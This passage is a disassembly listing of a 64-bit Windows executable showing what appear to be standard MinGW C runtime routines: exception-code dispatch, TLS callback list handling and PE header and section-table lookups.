   140001e76:	0f 84 a7 00 00 00    	je     0x140001f23
   140001e7c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e80:	75 40                	jne    0x140001ec2
   140001e82:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e87:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e8c:	e8 5f 81 00 00       	call   0x140009ff0
   140001e91:	84 db                	test   %bl,%bl
   140001e93:	0f 85 c7 00 00 00    	jne    0x140001f60
   140001e99:	e8 d2 f9 ff ff       	call   0x140001870
   140001e9e:	e9 bd 00 00 00       	jmp    0x140001f60
   140001ea3:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001ea8:	0f 84 b2 00 00 00    	je     0x140001f60
   140001eae:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001eb3:	74 46                	je     0x140001efb
   140001eb5:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001eba:	0f 84 a0 00 00 00    	je     0x140001f60
   140001ec0:	eb 61                	jmp    0x140001f23
   140001ec2:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001ec7:	e9 8e 00 00 00       	jmp    0x140001f5a
   140001ecc:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001ed1:	75 50                	jne    0x140001f23
   140001ed3:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ed8:	31 d2                	xor    %edx,%edx
   140001eda:	e8 11 81 00 00       	call   0x140009ff0
   140001edf:	48 85 c0             	test   %rax,%rax
   140001ee2:	74 3f                	je     0x140001f23
   140001ee4:	48 83 f8 01          	cmp    $0x1,%rax
   140001ee8:	75 64                	jne    0x140001f4e
   140001eea:	ba 01 00 00 00       	mov    $0x1,%edx
   140001eef:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ef4:	e8 f7 80 00 00       	call   0x140009ff0
   140001ef9:	eb 65                	jmp    0x140001f60
   140001efb:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f00:	31 d2                	xor    %edx,%edx
   140001f02:	e8 e9 80 00 00       	call   0x140009ff0
   140001f07:	48 85 c0             	test   %rax,%rax
   140001f0a:	74 17                	je     0x140001f23
   140001f0c:	48 83 f8 01          	cmp    $0x1,%rax
   140001f10:	75 43                	jne    0x140001f55
   140001f12:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f17:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f1c:	e8 cf 80 00 00       	call   0x140009ff0
   140001f21:	eb 3d                	jmp    0x140001f60
   140001f23:	48 8b 05 de 12 2c 00 	mov    0x2c12de(%rip),%rax        # 0x1402c3208
   140001f2a:	48 85 c0             	test   %rax,%rax
   140001f2d:	74 14                	je     0x140001f43
   140001f2f:	48 8b 15 d2 40 2c 00 	mov    0x2c40d2(%rip),%rdx        # 0x1402c6008
   140001f36:	48 89 f9             	mov    %rdi,%rcx
   140001f39:	48 83 c4 20          	add    $0x20,%rsp
   140001f3d:	5b                   	pop    %rbx
   140001f3e:	5f                   	pop    %rdi
   140001f3f:	5e                   	pop    %rsi
   140001f40:	48 ff e2             	rex.W jmp *%rdx
   140001f43:	31 f6                	xor    %esi,%esi
   140001f45:	eb 19                	jmp    0x140001f60
   140001f47:	b3 01                	mov    $0x1,%bl
   140001f49:	e9 19 ff ff ff       	jmp    0x140001e67
   140001f4e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f53:	eb 05                	jmp    0x140001f5a
   140001f55:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f5a:	ff 15 a8 40 2c 00    	call   *0x2c40a8(%rip)        # 0x1402c6008
   140001f60:	89 f0                	mov    %esi,%eax
   140001f62:	48 83 c4 20          	add    $0x20,%rsp
   140001f66:	5b                   	pop    %rbx
   140001f67:	5f                   	pop    %rdi
   140001f68:	5e                   	pop    %rsi
   140001f69:	c3                   	ret
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	ff e0                	jmp    *%rax
   140001f72:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001f79:	1f 84 00 00 00 00 00 
   140001f80:	c3                   	ret
   140001f81:	cc                   	int3
   140001f82:	cc                   	int3
   140001f83:	cc                   	int3
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	cc                   	int3
   140001f87:	cc                   	int3
   140001f88:	cc                   	int3
   140001f89:	cc                   	int3
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 c8             	mov    %rcx,%rax
   140001f93:	48 87 05 76 12 2c 00 	xchg   %rax,0x2c1276(%rip)        # 0x1402c3210
   140001f9a:	c3                   	ret
   140001f9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fa0:	48 8b 05 69 12 2c 00 	mov    0x2c1269(%rip),%rax        # 0x1402c3210
   140001fa7:	c3                   	ret
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	48 8b 05 39 94 00 00 	mov    0x9439(%rip),%rax        # 0x14000b3f0
   140001fb7:	48 8b 00             	mov    (%rax),%rax
   140001fba:	c3                   	ret
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	48 8b 05 31 94 00 00 	mov    0x9431(%rip),%rax        # 0x14000b3f8
   140001fc7:	48 8b 00             	mov    (%rax),%rax
   140001fca:	c3                   	ret
   140001fcb:	cc                   	int3
   140001fcc:	cc                   	int3
   140001fcd:	cc                   	int3
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	41 56                	push   %r14
   140001fd2:	56                   	push   %rsi
   140001fd3:	57                   	push   %rdi
   140001fd4:	53                   	push   %rbx
   140001fd5:	48 83 ec 28          	sub    $0x28,%rsp
   140001fd9:	31 f6                	xor    %esi,%esi
   140001fdb:	83 3d 36 12 2c 00 00 	cmpl   $0x0,0x2c1236(%rip)        # 0x1402c3218
   140001fe2:	74 54                	je     0x140002038
   140001fe4:	48 89 d7             	mov    %rdx,%rdi
   140001fe7:	89 cb                	mov    %ecx,%ebx
   140001fe9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001fee:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ff3:	e8 28 80 00 00       	call   0x14000a020
   140001ff8:	48 85 c0             	test   %rax,%rax
   140001ffb:	74 36                	je     0x140002033
   140001ffd:	49 89 c6             	mov    %rax,%r14
   140002000:	89 18                	mov    %ebx,(%rax)
   140002002:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140002006:	48 8d 3d 13 12 2c 00 	lea    0x2c1213(%rip),%rdi        # 0x1402c3220
   14000200d:	48 89 f9             	mov    %rdi,%rcx
   140002010:	ff 15 12 ac 00 00    	call   *0xac12(%rip)        # 0x14000cc28
   140002016:	48 8b 05 2b 12 2c 00 	mov    0x2c122b(%rip),%rax        # 0x1402c3248
   14000201d:	49 89 46 10          	mov    %rax,0x10(%r14)
   140002021:	4c 89 35 20 12 2c 00 	mov    %r14,0x2c1220(%rip)        # 0x1402c3248
   140002028:	48 89 f9             	mov    %rdi,%rcx
   14000202b:	ff 15 0f ac 00 00    	call   *0xac0f(%rip)        # 0x14000cc40
   140002031:	eb 05                	jmp    0x140002038
   140002033:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140002038:	89 f0                	mov    %esi,%eax
   14000203a:	48 83 c4 28          	add    $0x28,%rsp
   14000203e:	5b                   	pop    %rbx
   14000203f:	5f                   	pop    %rdi
   140002040:	5e                   	pop    %rsi
   140002041:	41 5e                	pop    %r14
   140002043:	c3                   	ret
   140002044:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000204b:	00 00 00 00 00 
   140002050:	56                   	push   %rsi
   140002051:	48 83 ec 20          	sub    $0x20,%rsp
   140002055:	83 3d bc 11 2c 00 00 	cmpl   $0x0,0x2c11bc(%rip)        # 0x1402c3218
   14000205c:	74 71                	je     0x1400020cf
   14000205e:	89 ce                	mov    %ecx,%esi
   140002060:	48 8d 0d b9 11 2c 00 	lea    0x2c11b9(%rip),%rcx        # 0x1402c3220
   140002067:	ff 15 bb ab 00 00    	call   *0xabbb(%rip)        # 0x14000cc28
   14000206d:	48 8b 0d d4 11 2c 00 	mov    0x2c11d4(%rip),%rcx        # 0x1402c3248
   140002074:	48 85 c9             	test   %rcx,%rcx
   140002077:	74 49                	je     0x1400020c2
   140002079:	8b 01                	mov    (%rcx),%eax
   14000207b:	39 f0                	cmp    %esi,%eax
   14000207d:	75 04                	jne    0x140002083
   14000207f:	31 c0                	xor    %eax,%eax
   140002081:	eb 24                	jmp    0x1400020a7
   140002083:	48 89 ca             	mov    %rcx,%rdx
   140002086:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000208d:	00 00 00 
   140002090:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140002094:	48 85 c9             	test   %rcx,%rcx
   140002097:	74 29                	je     0x1400020c2
   140002099:	44 8b 01             	mov    (%rcx),%r8d
   14000209c:	48 89 d0             	mov    %rdx,%rax
   14000209f:	48 89 ca             	mov    %rcx,%rdx
   1400020a2:	41 39 f0             	cmp    %esi,%r8d
   1400020a5:	75 e9                	jne    0x140002090
   1400020a7:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400020ab:	48 85 c0             	test   %rax,%rax
   1400020ae:	74 06                	je     0x1400020b6
   1400020b0:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400020b4:	eb 07                	jmp    0x1400020bd
   1400020b6:	48 89 15 8b 11 2c 00 	mov    %rdx,0x2c118b(%rip)        # 0x1402c3248
   1400020bd:	e8 6e 7f 00 00       	call   0x14000a030
   1400020c2:	48 8d 0d 57 11 2c 00 	lea    0x2c1157(%rip),%rcx        # 0x1402c3220
   1400020c9:	ff 15 71 ab 00 00    	call   *0xab71(%rip)        # 0x14000cc40
   1400020cf:	31 c0                	xor    %eax,%eax
   1400020d1:	48 83 c4 20          	add    $0x20,%rsp
   1400020d5:	5e                   	pop    %rsi
   1400020d6:	c3                   	ret
   1400020d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400020de:	00 00 
   1400020e0:	41 56                	push   %r14
   1400020e2:	56                   	push   %rsi
   1400020e3:	57                   	push   %rdi
   1400020e4:	53                   	push   %rbx
   1400020e5:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e9:	83 fa 03             	cmp    $0x3,%edx
   1400020ec:	0f 87 80 01 00 00    	ja     0x140002272
   1400020f2:	89 d0                	mov    %edx,%eax
   1400020f4:	48 8d 0d 05 93 00 00 	lea    0x9305(%rip),%rcx        # 0x14000b400
   1400020fb:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   1400020ff:	48 01 c8             	add    %rcx,%rax
   140002102:	ff e0                	jmp    *%rax
   140002104:	83 3d 0d 11 2c 00 00 	cmpl   $0x0,0x2c110d(%rip)        # 0x1402c3218
   14000210b:	0f 84 07 01 00 00    	je     0x140002218
   140002111:	48 8d 0d 08 11 2c 00 	lea    0x2c1108(%rip),%rcx        # 0x1402c3220
   140002118:	ff 15 0a ab 00 00    	call   *0xab0a(%rip)        # 0x14000cc28
   14000211e:	48 8b 3d 23 11 2c 00 	mov    0x2c1123(%rip),%rdi        # 0x1402c3248
   140002125:	48 85 ff             	test   %rdi,%rdi
   140002128:	0f 84 dd 00 00 00    	je     0x14000220b
   14000212e:	48 8b 1d 23 ab 00 00 	mov    0xab23(%rip),%rbx        # 0x14000cc58
   140002135:	4c 8b 35 f4 aa 00 00 	mov    0xaaf4(%rip),%r14        # 0x14000cc30
   14000213c:	eb 0f                	jmp    0x14000214d
   14000213e:	66 90                	xchg   %ax,%ax
   140002140:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140002144:	48 85 ff             	test   %rdi,%rdi
   140002147:	0f 84 be 00 00 00    	je     0x14000220b
   14000214d:	8b 0f                	mov    (%rdi),%ecx
   14000214f:	ff d3                	call   *%rbx
   140002151:	48 89 c6             	mov    %rax,%rsi
   140002154:	41 ff d6             	call   *%r14
   140002157:	85 c0                	test   %eax,%eax
   140002159:	75 e5                	jne    0x140002140
   14000215b:	48 85 f6             	test   %rsi,%rsi
   14000215e:	74 e0                	je     0x140002140
   140002160:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002164:	48 89 f1             	mov    %rsi,%rcx
   140002167:	ff 15 9b 3e 2c 00    	call   *0x2c3e9b(%rip)        # 0x1402c6008
   14000216d:	eb d1                	jmp    0x140002140
   14000216f:	83 3d a2 10 2c 00 00 	cmpl   $0x0,0x2c10a2(%rip)        # 0x1402c3218
   140002176:	75 0d                	jne    0x140002185
   140002178:	48 8d 0d a1 10 2c 00 	lea    0x2c10a1(%rip),%rcx        # 0x1402c3220
   14000217f:	ff 15 b3 aa 00 00    	call   *0xaab3(%rip)        # 0x14000cc38
   140002185:	c7 05 89 10 2c 00 01 	movl   $0x1,0x2c1089(%rip)        # 0x1402c3218
   14000218c:	00 00 00 
   14000218f:	e9 de 00 00 00       	jmp    0x140002272
   140002194:	e8 d7 f6 ff ff       	call   0x140001870
   140002199:	e9 d4 00 00 00       	jmp    0x140002272
   14000219e:	83 3d 73 10 2c 00 00 	cmpl   $0x0,0x2c1073(%rip)        # 0x1402c3218
   1400021a5:	0f 84 c7 00 00 00    	je     0x140002272
   1400021ab:	48 8d 0d 6e 10 2c 00 	lea    0x2c106e(%rip),%rcx        # 0x1402c3220
   1400021b2:	ff 15 70 aa 00 00    	call   *0xaa70(%rip)        # 0x14000cc28
   1400021b8:	48 8b 3d 89 10 2c 00 	mov    0x2c1089(%rip),%rdi        # 0x1402c3248
   1400021bf:	48 85 ff             	test   %rdi,%rdi
   1400021c2:	0f 84 9d 00 00 00    	je     0x140002265
   1400021c8:	48 8b 1d 89 aa 00 00 	mov    0xaa89(%rip),%rbx        # 0x14000cc58
   1400021cf:	4c 8b 35 5a aa 00 00 	mov    0xaa5a(%rip),%r14        # 0x14000cc30
   1400021d6:	eb 11                	jmp    0x1400021e9
   1400021d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021df:	00 
   1400021e0:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   1400021e4:	48 85 ff             	test   %rdi,%rdi
   1400021e7:	74 7c                	je     0x140002265
   1400021e9:	8b 0f                	mov    (%rdi),%ecx
   1400021eb:	ff d3                	call   *%rbx
   1400021ed:	48 89 c6             	mov    %rax,%rsi
   1400021f0:	41 ff d6             	call   *%r14
   1400021f3:	85 c0                	test   %eax,%eax
   1400021f5:	75 e9                	jne    0x1400021e0
   1400021f7:	48 85 f6             	test   %rsi,%rsi
   1400021fa:	74 e4                	je     0x1400021e0
   1400021fc:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002200:	48 89 f1             	mov    %rsi,%rcx
   140002203:	ff 15 ff 3d 2c 00    	call   *0x2c3dff(%rip)        # 0x1402c6008
   140002209:	eb d5                	jmp    0x1400021e0
   14000220b:	48 8d 0d 0e 10 2c 00 	lea    0x2c100e(%rip),%rcx        # 0x1402c3220
   140002212:	ff 15 28 aa 00 00    	call   *0xaa28(%rip)        # 0x14000cc40
   140002218:	8b 05 fa 0f 2c 00    	mov    0x2c0ffa(%rip),%eax        # 0x1402c3218
   14000221e:	83 f8 01             	cmp    $0x1,%eax
   140002221:	75 4f                	jne    0x140002272
   140002223:	48 8b 0d 1e 10 2c 00 	mov    0x2c101e(%rip),%rcx        # 0x1402c3248
   14000222a:	48 85 c9             	test   %rcx,%rcx
   14000222d:	74 12                	je     0x140002241
   14000222f:	90                   	nop
   140002230:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140002234:	e8 f7 7d 00 00       	call   0x14000a030
   140002239:	48 89 f1             	mov    %rsi,%rcx
   14000223c:	48 85 f6             	test   %rsi,%rsi
   14000223f:	75 ef                	jne    0x140002230
   140002241:	48 c7 05 fc 0f 2c 00 	movq   $0x0,0x2c0ffc(%rip)        # 0x1402c3248
   140002248:	00 00 00 00 
   14000224c:	c7 05 c2 0f 2c 00 00 	movl   $0x0,0x2c0fc2(%rip)        # 0x1402c3218
   140002253:	00 00 00 
   140002256:	48 8d 0d c3 0f 2c 00 	lea    0x2c0fc3(%rip),%rcx        # 0x1402c3220
   14000225d:	ff 15 bd a9 00 00    	call   *0xa9bd(%rip)        # 0x14000cc20
   140002263:	eb 0d                	jmp    0x140002272
   140002265:	48 8d 0d b4 0f 2c 00 	lea    0x2c0fb4(%rip),%rcx        # 0x1402c3220
   14000226c:	ff 15 ce a9 00 00    	call   *0xa9ce(%rip)        # 0x14000cc40
   140002272:	b8 01 00 00 00       	mov    $0x1,%eax
   140002277:	48 83 c4 28          	add    $0x28,%rsp
   14000227b:	5b                   	pop    %rbx
   14000227c:	5f                   	pop    %rdi
   14000227d:	5e                   	pop    %rsi
   14000227e:	41 5e                	pop    %r14
   140002280:	c3                   	ret
   140002281:	cc                   	int3
   140002282:	cc                   	int3
   140002283:	cc                   	int3
   140002284:	cc                   	int3
   140002285:	cc                   	int3
   140002286:	cc                   	int3
   140002287:	cc                   	int3
   140002288:	cc                   	int3
   140002289:	cc                   	int3
   14000228a:	cc                   	int3
   14000228b:	cc                   	int3
   14000228c:	cc                   	int3
   14000228d:	cc                   	int3
   14000228e:	cc                   	int3
   14000228f:	cc                   	int3
   140002290:	56                   	push   %rsi
   140002291:	48 83 ec 20          	sub    $0x20,%rsp
   140002295:	89 ce                	mov    %ecx,%esi
   140002297:	e8 a4 7d 00 00       	call   0x14000a040
   14000229c:	89 f1                	mov    %esi,%ecx
   14000229e:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   1400022a2:	48 c1 e1 04          	shl    $0x4,%rcx
   1400022a6:	48 01 c8             	add    %rcx,%rax
   1400022a9:	48 83 c4 20          	add    $0x20,%rsp
   1400022ad:	5e                   	pop    %rsi
   1400022ae:	c3                   	ret
   1400022af:	cc                   	int3
   1400022b0:	0f b7 11             	movzwl (%rcx),%edx
   1400022b3:	31 c0                	xor    %eax,%eax
   1400022b5:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400022bb:	75 1d                	jne    0x1400022da
   1400022bd:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   1400022c1:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   1400022c8:	75 10                	jne    0x1400022da
   1400022ca:	0f b7 4c 11 18       	movzwl 0x18(%rcx,%rdx,1),%ecx
   1400022cf:	31 c0                	xor    %eax,%eax
   1400022d1:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400022d7:	0f 94 c0             	sete   %al
   1400022da:	c3                   	ret
   1400022db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022e0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400022e4:	44 0f b7 44 01 06    	movzwl 0x6(%rcx,%rax,1),%r8d
   1400022ea:	45 85 c0             	test   %r8d,%r8d
   1400022ed:	74 2b                	je     0x14000231a
   1400022ef:	48 01 c1             	add    %rax,%rcx
   1400022f2:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400022f6:	48 01 c8             	add    %rcx,%rax
   1400022f9:	48 83 c0 18          	add    $0x18,%rax
   1400022fd:	eb 0a                	jmp    0x140002309
   1400022ff:	90                   	nop
   140002300:	48 83 c0 28          	add    $0x28,%rax
   140002304:	41 ff c8             	dec    %r8d
   140002307:	74 11                	je     0x14000231a
   140002309:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000230c:	48 39 d1             	cmp    %rdx,%rcx
   14000230f:	77 ef                	ja     0x140002300
   140002311:	03 48 08             	add    0x8(%rax),%ecx
   140002314:	48 39 d1             	cmp    %rdx,%rcx
   140002317:	76 e7                	jbe    0x140002300
   140002319:	c3                   	ret
   14000231a:	31 c0                	xor    %eax,%eax
   14000231c:	c3                   	ret
   14000231d:	0f 1f 00             	nopl   (%rax)
   140002320:	56                   	push   %rsi
   140002321:	57                   	push   %rdi
   140002322:	53                   	push   %rbx
   140002323:	48 83 ec 20          	sub    $0x20,%rsp
   140002327:	48 89 ce             	mov    %rcx,%rsi
   14000232a:	e8 21 7c 00 00       	call   0x140009f50
   14000232f:	31 ff                	xor    %edi,%edi
   140002331:	48 83 f8 08          	cmp    $0x8,%rax
   140002335:	77 68                	ja     0x14000239f
   140002337:	48 8b 05 ca 8c 00 00 	mov    0x8cca(%rip),%rax        # 0x14000b008
   14000233e:	0f b7 08             	movzwl (%rax),%ecx
   140002341:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   140002347:	75 56                	jne    0x14000239f
   140002349:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000234d:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140002354:	75 47                	jne    0x14000239d
   140002356:	48 01 c8             	add    %rcx,%rax
   140002359:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
   14000235d:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   140002363:	75 38                	jne    0x14000239d
   140002365:	0f b7 58 06          	movzwl 0x6(%rax),%ebx
   140002369:	85 db                	test   %ebx,%ebx
   14000236b:	74 30                	je     0x14000239d
   14000236d:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
   140002371:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   140002375:	48 83 c7 18          	add    $0x18,%rdi
   140002379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002380:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002386:	48 89 f9             	mov    %rdi,%rcx
   140002389:	48 89 f2             	mov    %rsi,%rdx
   14000238c:	e8 bf 7c 00 00       	call   0x14000a050
   140002391:	85 c0                	test   %eax,%eax
   140002393:	74 0a                	je     0x14000239f
   140002395:	48 83 c7 28          	add    $0x28,%rdi
   140002399:	ff cb                	dec    %ebx
   14000239b:	75 e3                	jne    0x140002380
   14000239d:	31 ff                	xor    %edi,%edi
   14000239f:	48 89 f8             	mov    %rdi,%rax
   1400023a2:	48 83 c4 20          	add    $0x20,%rsp
   1400023a6:	5b                   	pop    %rbx
   1400023a7:	5f                   	pop    %rdi
   1400023a8:	5e                   	pop    %rsi
   1400023a9:	c3                   	ret
   1400023aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023b0:	48 8b 05 51 8c 00 00 	mov    0x8c51(%rip),%rax        # 0x14000b008
   1400023b7:	0f b7 10             	movzwl (%rax),%edx
   1400023ba:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400023c0:	75 5a                	jne    0x14000241c
   1400023c2:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400023c6:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   1400023cd:	75 4d                	jne    0x14000241c
   1400023cf:	48 01 d0             	add    %rdx,%rax
   1400023d2:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400023d6:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   1400023dc:	75 3e                	jne    0x14000241c
   1400023de:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400023e2:	85 d2                	test   %edx,%edx
   1400023e4:	74 36                	je     0x14000241c
   1400023e6:	48 2b 0d 1b 8c 00 00 	sub    0x8c1b(%rip),%rcx        # 0x14000b008
   1400023ed:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   1400023f2:	4c 01 c0             	add    %r8,%rax
   1400023f5:	48 83 c0 18          	add    $0x18,%rax
   1400023f9:	eb 0d                	jmp    0x140002408
   1400023fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002400:	48 83 c0 28          	add    $0x28,%rax
   140002404:	ff ca                	dec    %edx
   140002406:	74 14                	je     0x14000241c
   140002408:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000240c:	4c 39 c1             	cmp    %r8,%rcx
   14000240f:	72 ef                	jb     0x140002400
   140002411:	44 03 40 08          	add    0x8(%rax),%r8d
   140002415:	4c 39 c1             	cmp    %r8,%rcx
   140002418:	73 e6                	jae    0x140002400
   14000241a:	eb 02                	jmp    0x14000241e
   14000241c:	31 c0                	xor    %eax,%eax
   14000241e:	c3                   	ret
   14000241f:	90                   	nop
   140002420:	48 8b 0d e1 8b 00 00 	mov    0x8be1(%rip),%rcx        # 0x14000b008
   140002427:	0f b7 11             	movzwl (%rcx),%edx
   14000242a:	31 c0                	xor    %eax,%eax
   14000242c:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002432:	75 21                	jne    0x140002455
   140002434:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002438:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000243f:	75 14                	jne    0x140002455
   140002441:	44 0f b7 44 11 18    	movzwl 0x18(%rcx,%rdx,1),%r8d
   140002447:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   14000244e:	75 05                	jne    0x140002455
   140002450:	0f b7 44 11 06       	movzwl 0x6(%rcx,%rdx,1),%eax
   140002455:	c3                   	ret
   140002456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000245d:	00 00 00 
   140002460:	48 8b 05 a1 8b 00 00 	mov    0x8ba1(%rip),%rax        # 0x14000b008
   140002467:	0f b7 10             	movzwl (%rax),%edx
   14000246a:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002470:	75 56                	jne    0x1400024c8
   140002472:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002476:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   14000247d:	75 49                	jne    0x1400024c8
   14000247f:	48 01 d0             	add    %rdx,%rax
   140002482:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   140002486:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000248c:	75 3a                	jne    0x1400024c8
   14000248e:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140002492:	85 d2                	test   %edx,%edx
   140002494:	74 32                	je     0x1400024c8
   140002496:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   14000249b:	4c 01 c0             	add    %r8,%rax
   14000249e:	48 83 c0 18          	add    $0x18,%rax
   1400024a2:	eb 14                	jmp    0x1400024b8
   1400024a4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400024ab:	00 00 00 00 00 
   1400024b0:	48 83 c0 28          	add    $0x28,%rax
   1400024b4:	ff ca                	dec    %edx
   1400024b6:	74 10                	je     0x1400024c8
   1400024b8:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   1400024bc:	74 f2                	je     0x1400024b0
   1400024be:	48 85 c9             	test   %rcx,%rcx
   1400024c1:	74 07                	je     0x1400024ca
   1400024c3:	48 ff c9             	dec    %rcx
   1400024c6:	eb e8                	jmp    0x1400024b0
   1400024c8:	31 c0                	xor    %eax,%eax
   1400024ca:	c3                   	ret
   1400024cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024d0:	48 8b 05 31 8b 00 00 	mov    0x8b31(%rip),%rax        # 0x14000b008
   1400024d7:	0f b7 08             	movzwl (%rax),%ecx
   1400024da:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   1400024e0:	75 1a                	jne    0x1400024fc
   1400024e2:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400024e6:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   1400024ed:	75 0d                	jne    0x1400024fc
   1400024ef:	0f b7 4c 08 18       	movzwl 0x18(%rax,%rcx,1),%ecx
   1400024f4:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400024fa:	74 02                	je     0x1400024fe
   1400024fc:	31 c0                	xor    %eax,%eax
   1400024fe:	c3                   	ret
   1400024ff:	90                   	nop
   140002500:	48 8b 15 01 8b 00 00 	mov    0x8b01(%rip),%rdx        # 0x14000b008
   140002507:	44 0f b7 02          	movzwl (%rdx),%r8d
   14000250b:	31 c0                	xor    %eax,%eax
   14000250d:	41 81 f8 4d 5a 00 00 	cmp    $0x5a4d,%r8d
   140002514:	75 70                	jne    0x140002586
   140002516:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   14000251a:	42 81 3c 02 50 45 00 	cmpl   $0x4550,(%rdx,%r8,1)
   140002521:	00 
   140002522:	75 62                	jne    0x140002586
   140002524:	4c 01 c2             	add    %r8,%rdx
   140002527:	44 0f b7 42 18       	movzwl 0x18(%rdx),%r8d
   14000252c:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   140002533:	75 51                	jne    0x140002586
   140002535:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   14000253a:	4d 85 c0             	test   %r8,%r8
   14000253d:	74 47                	je     0x140002586
   14000253f:	48 2b 0d c2 8a 00 00 	sub    0x8ac2(%rip),%rcx        # 0x14000b008
   140002546:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   14000254a:	48 01 d0             	add    %rdx,%rax
   14000254d:	48 83 c0 18          	add    $0x18,%rax
